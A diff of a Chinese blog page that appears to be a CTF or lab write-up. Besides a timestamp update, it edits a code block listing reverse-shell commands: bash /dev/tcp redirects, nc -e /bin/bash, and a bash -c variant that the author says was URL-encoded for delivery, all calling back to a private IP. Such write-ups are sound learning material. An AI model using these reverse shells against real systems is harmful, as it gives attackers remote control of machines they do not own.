@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/biaoti.jpg">
 <meta property="article:published_time" content="2025-05-26T06:24:46.000Z">
-<meta property="article:modified_time" content="2025-05-27T12:13:34.913Z">
+<meta property="article:modified_time" content="2025-06-02T13:11:35.687Z">
 <meta property="article:author" content="Achernar">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
@@ -565,7 +565,7 @@
 <ul>
 <li>成功写入，直接开启监听反弹shell</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1<br>nc -e /bin/bash 192.168.11.128 9999<br><span class="hljs-meta prompt_">#</span><span class="language-bash">他奶奶的都反弹不成功，出题人干鸡毛（不是人）</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">反弹成功</span><br>bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1&#x27; （bash -c 会把字符串当作命令执行）<br>在这里不能直接这样传，因为在url上可能会有问题例如会把&amp;当做连接符，所以我们编码后传<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">另一条语句：</span><br>echo &quot;bash -i &gt;&amp; /dev/tcp/172.18.171.250/4444 0&gt;&amp;1&quot; | bash（同样可以反弹）<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1<br>nc -e /bin/bash 192.168.11.128 9999<br><span class="hljs-meta prompt_">#</span><span class="language-bash">他奶奶的都反弹不成功，出题人干鸡毛（不是人）</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">反弹成功</span><br>bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1&#x27; （bash -c 会把字符串当作命令执行）<br>在这里不能直接这样传，因为在url上可能会有问题例如会把&amp;当做连接符，所以我们编码后传<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">另一条语句：</span><br>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.11.128/9999 0&gt;&amp;1&quot; | bash（同样可以反弹）<br></code></pre></td></tr></table></figure>
 
 
 
